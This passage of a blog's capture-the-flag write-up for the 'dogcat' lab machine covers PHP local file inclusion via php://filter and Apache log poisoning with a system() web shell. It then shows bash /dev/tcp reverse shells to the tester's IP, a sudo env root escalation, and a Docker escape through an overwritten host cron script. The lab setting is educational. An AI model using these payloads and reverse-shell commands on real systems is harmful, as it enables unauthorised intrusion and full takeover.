</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.2.0-dev
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/10/30 09:43:01 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 418<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/cat.php              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 26<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/flag.php             <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/cats                 <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 309<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.202.202/cats/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/dogs                 <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 309<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.202.202/dogs/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/dog.php              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 26<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>441122</span> / <span style=color:#ae81ff>441124</span> <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)===============================================================</span>
</span></span><span style=display:flex><span>2022/10/30 09:59:03 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>After poking around we identified that either the string <code>dog</code> or <code>cat</code> must be in the value of the <code>view</code> parameter.<br>If we navigate to the URL: <code>http://10.10.202.202/?view=dog1</code> we get the following warnings:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Here you go!
</span></span><span style=display:flex><span>Warning: include<span style=color:#f92672>(</span>dog1.php<span style=color:#f92672>)</span>: failed to open stream: No such file or directory in /var/www/html/index.php on line <span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Warning: include<span style=color:#f92672>()</span>: Failed opening <span style=color:#e6db74>&#39;dog1.php&#39;</span> <span style=color:#66d9ef>for</span> inclusion <span style=color:#f92672>(</span>include_path<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;.:/usr/local/lib/php&#39;</span><span style=color:#f92672>)</span> in /var/www/html/index.php on line <span style=color:#ae81ff>24</span>
</span></span></code></pre></div><p>These warnings reveal that <code>include_path</code> is used, which probably checks for the strings <code>dog</code> or <code>cat</code>.</p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>So, it is possible for an <code>LFI</code> to be there, so we will try some payloads from: <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</a><br></p><p>The successful payload is: <code>php://filter/convert.base64-encode/resource=</code>, so the URL becomes: <code>http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog</code> resulting to: <code>Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K</code><br></p><h3 id=flag-1>Flag 1<a hidden class=anchor aria-hidden=true href=#flag-1>#</a></h3><p>We have also found <code>flag.php</code> from <code>gobuster</code> so we can read the 1st flag by navigating to: <code>http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../flag</code>. The output is: <code>Here you go![REDACTED]</code>, which we can decode from <code>base64</code>.<br></p><p>We can navigate to: <code>http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../index</code> in order to view the source code of <code>index.php</code> (if we first decode it from base64):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE HTML&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>title</span>&gt;dogcat&lt;/<span style=color:#f92672>title</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/css&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/style.css&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>h1</span>&gt;dogcat&lt;/<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>i</span>&gt;a gallery of various dogs or cats&lt;/<span style=color:#f92672>i</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>h2</span>&gt;What would you like to see?&lt;/<span style=color:#f92672>h2</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/?view=dog&#34;</span>&gt;&lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dog&#34;</span>&gt;A dog&lt;/<span style=color:#f92672>button</span>&gt;&lt;/<span style=color:#f92672>a</span>&gt; &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/?view=cat&#34;</span>&gt;&lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;cat&#34;</span>&gt;A cat&lt;/<span style=color:#f92672>button</span>&gt;&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;?php
</span></span></span><span style=display:flex><span><span style=color:#75715e>            function containsStr($str, $substr) {
</span></span></span><span style=display:flex><span><span style=color:#75715e>                return strpos($str, $substr) !== false;
</span></span></span><span style=display:flex><span><span style=color:#75715e>            }
</span></span></span><span style=display:flex><span><span style=color:#75715e>	    $ext = isset($_GET[&#34;ext&#34;]) ? $_GET[&#34;ext&#34;] : &#39;.php&#39;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>            if(isset($_GET[&#39;view&#39;])) {
</span></span></span><span style=display:flex><span><span style=color:#75715e>                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) {
</span></span></span><span style=display:flex><span><span style=color:#75715e>                    echo &#39;Here you go!&#39;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>                    include $_GET[&#39;view&#39;] . $ext;
</span></span></span><span style=display:flex><span><span style=color:#75715e>                } else {
</span></span></span><span style=display:flex><span><span style=color:#75715e>                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>                }
</span></span></span><span style=display:flex><span><span style=color:#75715e>            }
</span></span></span><span style=display:flex><span><span style=color:#75715e>        ?&gt;</span>
</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><p>We notice that <code>index.php</code> also checks for the <code>ext</code> parameter and if it&rsquo;s missing, it appends <code>.php</code>.<br></p><p>So, we can read now the <code>/var/log/apache2/access.log</code> on the URL: <code>http://10.10.202.202/?view=php://filter/convert.base64-encode/resource=dog/../../../../var/log/apache2/access.log&ext</code> (again after decoding from base64).<br></p><p>So, we can perform <code>log poisoning</code> in order to execute commands.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -vn 10.10.202.202 <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.202.202<span style=color:#f92672>]</span> <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span>http<span style=color:#f92672>)</span> open
</span></span><span style=display:flex><span>GET /&lt;?php system<span style=color:#f92672>(</span>$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;cmd&#39;</span><span style=color:#f92672>])</span>; ?&gt;    
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
</span></span><span style=display:flex><span>Date: Sun, <span style=color:#ae81ff>30</span> Oct <span style=color:#ae81ff>2022</span> 08:30:36 GMT
</span></span><span style=display:flex><span>Server: Apache/2.4.38 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>302</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>iso-8859-1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;!DOCTYPE HTML PUBLIC <span style=color:#e6db74>&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;html&gt;&lt;head&gt;
</span></span><span style=display:flex><span>&lt;title&gt;400 Bad Request&lt;/title&gt;
</span></span><span style=display:flex><span>&lt;/head&gt;&lt;body&gt;
</span></span><span style=display:flex><span>&lt;h1&gt;Bad Request&lt;/h1&gt;
</span></span><span style=display:flex><span>&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
</span></span><span style=display:flex><span>&lt;/p&gt;
</span></span><span style=display:flex><span>&lt;hr&gt;
</span></span><span style=display:flex><span>&lt;address&gt;Apache/2.4.38 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span> Server at 172.17.0.2 Port 80&lt;/address&gt;
</span></span><span style=display:flex><span>&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></div><p>The response has <code>400</code> HTTP status code but we can verify that the <code>log poisoning</code> was successful by navigating to:
<code>http://10.10.202.202/?view=.dog/../../../../var/log/apache2/access.log&cmd=id&ext</code><br></p><p>The output is: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>, so we now can get a reverse shell through Burp Suite.<br></p><p>Refresh this page: <code>http://10.10.202.202/?view=.dog/../../../../var/log/apache2/access.log&cmd=id&ext</code> and Intercept it with Burp. Then replace the <code>id</code> command with <code>bash -c 'exec bash -i &>/dev/tcp/10.8.16.74/443 &lt;&1'</code> but URL-encoded.<br>So the request should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>GET /?view<span style=color:#f92672>=</span>.dog/../../../../var/log/apache2/access.log&amp;cmd<span style=color:#f92672>=</span>bash+-c+<span style=color:#e6db74>&#39;exec+bash+-i+%26&gt;/dev/tcp/10.8.16.74/443+&lt;%261&#39;</span>&amp;ext HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.202.202
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>Then, open a netcat listener and we have a reverse shell as <code>www-data</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.8.16.74<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.202.202<span style=color:#f92672>]</span> <span style=color:#ae81ff>54374</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@85e25e675ab4:/var/www/html$ whoami
</span></span><span style=display:flex><span>www-data
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>After executing the command: <code>sudo -l</code> we see that we can execute <code>/usr/bin/env</code> as root without being asked for root password.<br>We can use the following command to become root: <code>sudo env /bin/sh</code> found on: <a href=https://gtfobins.github.io/gtfobins/env/#sudo>https://gtfobins.github.io/gtfobins/env/#sudo</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@85e25e675ab4:/var/www/html$ sudo -l
</span></span><span style=display:flex><span>sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> www-data on 85e25e675ab4:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User www-data may run the following commands on 85e25e675ab4:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/env
</span></span><span style=display:flex><span>www-data@85e25e675ab4:/var/www/html$ sudo env /bin/sh
</span></span><span style=display:flex><span>sudo env /bin/sh
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span></code></pre></div><h3 id=flag-2>Flag 2<a hidden class=anchor aria-hidden=true href=#flag-2>#</a></h3><p>The 2nd flag can be found in: <code>/var/www/flag2_QMW7JvaY2LvK.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cd /var/www
</span></span><span style=display:flex><span>cat flag2_QMW7JvaY2LvK.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><h3 id=flag-3>Flag 3<a hidden class=anchor aria-hidden=true href=#flag-3>#</a></h3><p>The 3rd flag can be found in: <code>/root/flag3.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cd /root
</span></span><span style=display:flex><span>cat flag3.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><h3 id=flag-4>Flag 4<a hidden class=anchor aria-hidden=true href=#flag-4>#</a></h3><p>If we navigate to <code>/</code> we see the file <code>.dockerenv</code> meaning that we are in <code>Docker container</code>.<br></p><p>There is an interesting file <code>backup.sh</code> in <code>/opt/backups/</code>, which should be executed as a Cron job on the Host machine, because it is executing a <code>tar</code> command. So, we can modify <code>backup.sh</code> in order to get a reverse shell from the Host.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>echo <span style=color:#e6db74>&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.8.16.74/443 &lt;&amp;1&#39;&#34;</span> &gt; backup.sh 
</span></span><span style=display:flex><span>cat backup.sh
</span></span><span style=display:flex><span>bash -c <span style=color:#e6db74>&#39;exec bash -i &amp;&gt;/dev/tcp/10.8.16.74/443 &lt;&amp;1&#39;</span>
</span></span></code></pre></div><p>Open a netcat listener on 443 port and wait for the connection.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.8.16.74<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.202.202<span style=color:#f92672>]</span> <span style=color:#ae81ff>38480</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>3679<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>root@dogcat:~# id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@dogcat:~# cat flag4.txt
</span></span><span style=display:flex><span>cat flag4.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Now are the <code>root</code> user on the Host machine.</p><p>Proof of Concept (PoC image):
<img src=../../../thm/dogcat/dogcat.png alt="Olympus photo" style=width:700px;height:300px></p><ul class=post-tags><li><a href=https://geobour98.com/tags/linux/><strong>linux</strong></a></li><li><a href=https://geobour98.com/tags/web/><strong>web</strong></a><li><li><a href=https://geobour98.com/tags/lfi/><strong>lfi</strong></a></li><li><a href=https://geobour98.com/tags/php/><strong>php</strong></a><li><li><a href=https://geobour98.com/tags/log-poisoning/><strong>log-poisoning</strong></a></li><li><a href=https://geobour98.com/tags/sudo/><strong>sudo</strong></a></li><li><a href=https://geobour98.com/tags/env/><strong>env</strong></a></li><li><a href=https://geobour98.com/tags/gtfobins/><strong>gtfobins</strong></a></li><li><a href=https://geobour98.com/tags/docker/><strong>docker</strong></a></li><li><a href=https://geobour98.com/tags/container/><strong>container</strong></a></li></ul></div><footer class=post-footer></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>